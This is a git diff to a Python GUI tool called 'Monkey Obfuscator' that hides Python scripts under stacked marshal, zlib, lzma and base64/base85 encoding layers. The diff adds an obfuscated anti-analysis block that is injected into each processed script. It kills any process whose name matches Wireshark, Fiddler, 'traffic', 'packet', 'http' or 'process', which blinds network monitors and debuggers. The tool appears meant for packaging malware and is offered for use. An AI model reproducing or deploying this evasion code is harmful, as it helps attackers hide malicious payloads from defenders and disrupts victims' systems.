@@ -1,5 +1,42 @@
-# Monkey Obfuscator
-import marshal, zlib, base64, os
+'''
+
+MONKEY OBFUSCATOR // vesper#0003
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@|vesper|@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,(((((((((((((((((,%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@/(((((((((((((((((((((((((/(@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@/(((((((((((((((((((((((((((((((/@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@/((((((((((((((((((((((((((((((((((((@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@/((((((/@@@@@@@@@@@/(/@@@@@@@@@@@/((((((/@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@/(((((,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.((((((@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@*(((((@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(((((/@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@(((((*@@@@@@/((((,@@@@@@@@@/(((//@@@@@@@(((((*@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@(((((*@@@@@(((((((((*@@@@#((((((((( @@@@@*((((*@@@@@@@@@@@@@@@@
+@@@@@@@/((((((((((((((*@@@@.((((((((((@@@@/((((((((((@@@@@,((((((((((((((,@@@@@@
+@@@@@/((((((/(((((((((/@@@@@*((((((((%@@@@@/(((((((/@@@@@@/((((((((((((((((*@@@@
+@@@@/((((%@@@@@@*((((((,@@@@@@@# #&@@@@@@@@@@@#.#@@@@@@@@/((((((.@@@@@@(((((/@@@
+@@@&((((@@@@@@@@@*((((((,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,((((((,@@@@@@@@ ((((@@@
+@@@&((((#@@@@@@@@/(((((((*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*(((((((,@@@@@@@@ ((((@@@
+@@@@/((((,@@@@@@/((((((&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&((((((,@@@@@@*((((*@@@
+@@@@@*(((((((((((((((.@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.(((((((((((((((,@@@@
+@@@@@@@,((((((((((((.@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.((((((((((((.@@@@@@
+@@@@@@@@@@@@&&@@.(((@@@@@@@,(((((((((((((((((((((((((*@@@@@@@(((.@@&&@@@@@@@@@@@
+@@@@@@@@@@@@@@@@.((( @@@@@@@,((((((((((((((((((((((( @@@@@@@@(((,@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@((((&@@@@@@@@/(((((((((((((((((((/@@@@@@@@@((((@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@((((.@@@@@@@@@@.(((((((((((((.@@@@@@@@@@.((((@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@,((((/@@@@@@@@@@@@@*///*@@@@@@@@@@@@@/((((,@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@,(((((/*@@@@@@@@@@@@@@@@@@@@@@@*/(((((,@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@/((((((((*,&@@@@@@@&@*/(((((((/@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#./(((((((((((((((((/.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+'''
+import marshal, zlib, base64, os, lzma
 from sys import argv
 from tkinter import *
 from tkinter import messagebox
@@ -32,23 +69,54 @@ class Monkey:
         marsrc = compile(mysrc, 'coduter', 'exec')
         encode1 = marshal.dumps(marsrc)
         encode2 = zlib.compress(encode1)
-        encode3 = base64.b64encode(encode2)
+        encode7 = lzma.compress(encode2)
+        encode3 = base64.b64encode(encode7)
+        encode6 = base64.b85encode(encode3)
         symbol = '__MONKEY_WALL' *300
         with open(src, 'w') as f:
-            f.write('import marshal, zlib, base64\n')
+            f.write('import marshal, zlib, base64, lzma\n')
             f.write(symbol+f"='{symbol}'\n")
             f.write(symbol+f"='{symbol}'")
-            f.write(f"\nexec(marshal.loads(zlib.decompress(base64.b64decode({encode3}))))\n")
+            f.write(f"\nexec(marshal.loads(zlib.decompress(lzma.decompress(base64.b64decode(base64.b85decode({encode6}))))))\n")
             f.write(symbol+f"='{symbol}'\n")
             f.write(symbol+f"='{symbol}'")
             f.close()
 
     def monkeylol(self,src):
+        symbol = '__MONKEY_MONKEY' * 300
+        antiprocess = r"""
+try:       
+    from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess
+    def MONKEND(MONKEYNAMEZ):
+        for MONKEYPROC in process_iter():
+            try:
+                for MONK in MONKEYNAMEZ: 
+                    if MONK.lower() in MONKEYPROC.name().lower():MONKEYPROC.kill()
+            except (NoSuchProcess, AccessDenied, ZombieProcess):pass
+    def MONKSTART():MONKEYNAMES = ['http', 'traffic', 'wireshark', 'fiddler', 'packet', 'process'];return MONKEND(MONKEYNAMEZ=MONKEYNAMES)  
+    MONKSTART()
+except:pass
+        """
+        obf_antiprocess = compile(antiprocess, 'coduter', 'exec')
+        mar1 = marshal.dumps(obf_antiprocess)
+        zlib1 = zlib.compress(mar1)
+        lzma1 = lzma.compress(zlib1)
+        b641 = base64.b64encode(lzma1)
+        antiprocess_obf = f'\nexec(marshal.loads(zlib.decompress(lzma.decompress(base64.b64decode({b641})))))\n'
+        with open(src, 'r') as e:
+            MONKEYHAHA = e.read()
+        with open(src, 'w') as f:
+            f.write(symbol+f"='{symbol}'\n")
+            f.write("import base64, marshal, zlib, lzma\n")
+            f.write(symbol+f"='{symbol}'\n")
+            f.write(antiprocess_obf)
+            f.write("\n"+symbol+f"='{symbol}'\n")
+            f.write("\n"+MONKEYHAHA)
+            f.write("\n"+symbol+f"='{symbol}'\n")
         b64 = lambda _monkay : base64.b64encode(_monkay)
         mar = lambda _monkay : marshal.dumps(compile(_monkay,'<x>','exec'))
         zlb = lambda _monkay : zlib.compress(_monkay)
         OFFSET = 10
-        symbol = '__MONKEY_MONKEY' * 300
         with open(src, 'r', encoding='utf-8', errors='ignore') as file:
             content = file.read()
         b64_content = base64.b64encode(content.encode()).decode()
@@ -74,14 +142,16 @@ class Monkey:
         marsrc = compile(beforemarsh, 'coduter', 'exec')
         obfmarsh = marshal.dumps(marsrc)
         obfzlib = zlib.compress(obfmarsh)
-        obfbase64 = base64.b64encode(obfzlib)
+        obflzma = lzma.compress(obfzlib)
+        obfbase64 = base64.b64encode(obflzma)
         obfbase16 = base64.b16encode(obfbase64)
         obfbase32 = base64.b32encode(obfbase16)
         obfbase85 = base64.b85encode(obfbase32)
-        code += f'exec(marshal.loads(zlib.decompress(base64.b64decode(base64.b16decode(base64.b32decode(base64.b85decode({obfbase85})))))))'
+        code += f'exec(marshal.loads(zlib.decompress(lzma.decompress(base64.b64decode(base64.b16decode(base64.b32decode(base64.b85decode({obfbase85}))))))))'
         with open(src, 'w+') as f:
-            f.write("import marshal, zlib, base64\n")
+            f.write("import marshal, zlib, base64, lzma\n")
             f.write(code)
+            f.write(f"\n{symbol} = '{symbol}'")
     def findpy(self):
         filename = askopenfilename(filetypes=(("python files","*.py"),("All files","*.*")))
         self.filetoobf.insert(END,filename)
